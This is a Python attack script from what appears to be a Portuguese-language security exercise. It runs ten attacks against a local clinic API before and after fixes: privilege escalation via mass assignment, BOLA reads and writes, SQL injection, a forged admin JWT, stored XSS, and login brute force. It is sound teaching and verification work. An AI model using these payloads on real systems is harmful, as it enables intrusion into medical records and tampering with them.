"""Ataques do Exercício 8 executados ANTES e DEPOIS das correções do Exercício 9.

O MESMO conjunto de requisições roda contra a versão vulnerável (--target baseline, :8001)
e contra a versão corrigida (--target fixed, :8000). Para cada ataque o veredito é:
  EXPLORADO -> o ataque funcionou (vulnerabilidade presente)
  BLOQUEADO -> o ataque falhou (correção eficaz)
Uso:  python attack.py --target baseline|fixed [--base URL] [--json saida.json]
"""
import argparse
import json
import re
import sys
import time
from datetime import date, timedelta
from pathlib import Path

import httpx2 as httpx
import jwt

HERE = Path(__file__).resolve().parent
LOCAL = HERE.parent / ".local"
BASELINE_PASSWORD = "Baseline-Pass-1!"
OLD_STARTER_SECRET = "chave_secreta_super_segura_para_estudantes"  # público: está no repositório do starter kit
XSS = "<script>alert('xss-stored')</script>"

p = argparse.ArgumentParser()
p.add_argument("--target", choices=["baseline", "fixed"], required=True)
p.add_argument("--base")
p.add_argument("--json")
args = p.parse_args()
base = args.base or ("http://127.0.0.1:8001" if args.target == "baseline" else "http://127.0.0.1:8000")
http = httpx.Client(base_url=base, timeout=15)

if args.target == "baseline":
    password = lambda email: BASELINE_PASSWORD  # noqa: E731
else:
    creds = json.loads((LOCAL / "demo_credentials.json").read_text())
    password = lambda email: creds[email]["password"]  # noqa: E731

HELENA, PAULO, RITA = "helena@demo.clinica.com.br", "paulo@demo.clinica.com.br", "recepcao@demo.clinica.com.br"
results: list[dict] = []


def login(email: str) -> dict:
    r = http.post("/user/signin", data={"username": email, "password": password(email)})
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def short(r: httpx.Response, n: int = 160) -> str:
    t = r.text.replace("\n", " ")
    return f"HTTP {r.status_code} {t[:n]}{'…' if len(t) > n else ''}"


def record(aid: str, owasp: str, title: str, exploited: bool, evidence: str) -> None:
    verdict = "EXPLORADO" if exploited else "BLOQUEADO"
    results.append({"id": aid, "owasp": owasp, "title": title, "verdict": verdict, "evidence": evidence})
    print(f"[{aid}] {verdict:<9} {owasp} — {title}\n        {evidence}")


print(f"##### alvo: {args.target} ({base}) #####")
helena, paulo, rita = login(HELENA), login(PAULO), login(RITA)
victim_appt = http.get("/appointment/", headers=helena).json()[0]
victim_patient_id = victim_appt["patient_id"]

# A1 — escalonamento de privilégio via cadastro público com role=admin
body = {"name": "Atacante Teste", "email": "atacante@evil.example.org", "password": "Senha-Forte-12345", "role": "admin"}
r = http.post("/user/signup", json=body)
exploited = False
if r.status_code in (200, 201):
    s = http.post("/user/signin", data={"username": body["email"], "password": body["password"]})
    if s.status_code == 200 and "access_token" in s.json():
        exploited = http.get("/user/", headers={"Authorization": f"Bearer {s.json()['access_token']}"}).status_code == 200
record("A1", "A01 / API3 — mass assignment + escalada de privilégio", "POST /user/signup sem login, com role=admin",
       exploited, short(r))

# A2 — BOLA de leitura: Paulo lê a consulta (prontuário) da Dra. Helena trocando o ID
r = http.get(f"/appointment/{victim_appt['id']}", headers=paulo)
record("A2", "A01 / API1 — BOLA (leitura)", f"GET /appointment/{victim_appt['id']} por outro profissional",
       r.status_code == 200 and bool(r.json().get("notes")), short(r))

# A3 — mesmo padrão em endpoint NÃO citado no enunciado do Ex. 8: pacientes
r = http.get(f"/patient/{victim_patient_id}", headers=paulo)
record("A3", "A01 / API1 — BOLA (mesmo padrão, outro endpoint)", f"GET /patient/{victim_patient_id} por outro profissional",
       r.status_code == 200 and "cpf" in r.json(), short(r))

# A4 — BOLA de escrita: Paulo adultera o prontuário da Dra. Helena
r = http.put(f"/appointment/{victim_appt['id']}", json={"notes": "ADULTERADO PELO ATACANTE"}, headers=paulo)
check = http.get(f"/appointment/{victim_appt['id']}", headers=helena).json()
record("A4", "A01 / API1 — BOLA (escrita)", f"PUT /appointment/{victim_appt['id']} por outro profissional",
       "ADULTERADO" in str(check.get("notes")), short(r))

# A5 — SQL injection na busca de pacientes: Paulo tenta listar TODOS os pacientes
r = http.get("/patient/search", params={"name": "' OR '1'='1"}, headers=paulo)
rows = r.json() if r.status_code == 200 else []
record("A5", "A03 — SQL injection", "GET /patient/search?name=' OR '1'='1",
       len(rows) >= 4, f"{short(r, 110)} | linhas devolvidas: {len(rows)} (Paulo só tem 2 pacientes)")

# A6 — forjar JWT de admin com o segredo público do starter kit
now = int(time.time())
forged = jwt.encode({
    "user": "admin@demo.clinica.com.br", "expires": now + 3600,  # formato do starter kit
    "iss": "clinica-api", "aud": "clinica-api", "sub": "1", "iat": now, "nbf": now, "exp": now + 3600,
    "jti": "forjado", "token_use": "access", "role": "admin",  # formato da versão corrigida
}, OLD_STARTER_SECRET, algorithm="HS256")
r = http.get("/user/", headers={"Authorization": f"Bearer {forged}"})
record("A6", "A02 / A07 — segredo JWT fixo => token forjado", "GET /user/ com JWT de admin assinado com o segredo do repositório",
       r.status_code == 200, short(r))

# A7 — XSS armazenado: profissional grava <script> no motivo; a recepção abre a agenda
slot = (date.today() + timedelta(days=11)).isoformat() + "T11:00:00"
payload = {"patient_id": victim_patient_id, "date_time": slot, "reason": XSS}
if args.target == "baseline":
    payload["professional_id"] = victim_appt["professional_id"]
c = http.post("/appointment/new", json=payload, headers=helena)
page = http.get("/web/agenda", params={"day": slot[:10]} if args.target == "fixed" else None, headers=rita)
raw_in_html = XSS in page.text
record("A7", "A03 — XSS armazenado", "motivo da consulta com <script> exibido na página da recepção",
       raw_in_html, f"gravação: {short(c, 70)} | <script> cru na página: {raw_in_html}")

# A9 — excesso de exposição de dados
a = http.get(f"/appointment/{victim_appt['id']}", headers=helena).json()
pt = http.get(f"/patient/{victim_patient_id}", headers=helena).json()
leaked = sorted(set(a) & {"created_from_ip", "internal_audit_note", "created_by_user_id", "created_at"})
cpf_full = bool(re.fullmatch(r"\d{11}", str(pt.get("cpf", ""))))
record("A9", "API3 — excessive data exposure", "campos internos de auditoria e CPF completo nas respostas",
       bool(leaked) or cpf_full, f"campos internos devolvidos: {leaked or 'nenhum'} | CPF completo: {cpf_full}")

# A10 — CORS curinga e cabeçalhos ausentes
r = http.get("/health", headers={"Origin": "https://evil.example.org"})
acao = r.headers.get("access-control-allow-origin")
missing = [h for h in ("strict-transport-security", "x-frame-options", "x-content-type-options") if h not in r.headers]
record("A10", "A05 — security misconfiguration", "CORS para origem maliciosa + cabeçalhos HSTS/XFO/XCTO",
       acao in ("*", "https://evil.example.org") or bool(missing),
       f"Access-Control-Allow-Origin={acao} | cabeçalhos ausentes: {missing or 'nenhum'}")

# A8 — força bruta no login (por último: no alvo corrigido isto aciona o rate limit)
codes = [http.post("/user/signin", data={"username": "alvo.inexistente@clinica.com.br", "password": f"tentativa-{i}-x"}).status_code
         for i in range(30)]
record("A8", "A07 — força bruta sem limite", "30 tentativas de login em sequência",
       429 not in codes, f"status das 30 tentativas: 401 x{codes.count(401)}, 429 x{codes.count(429)}")

results.sort(key=lambda x: int(x["id"][1:]))
exploited_n = sum(r["verdict"] == "EXPLORADO" for r in results)
print(f"\nRESUMO ({args.target}): {exploited_n} explorados / {len(results) - exploited_n} bloqueados de {len(results)} ataques")
if args.json:
    Path(args.json).write_text(json.dumps({"target": args.target, "results": results}, indent=2, ensure_ascii=False))
sys.exit(0)
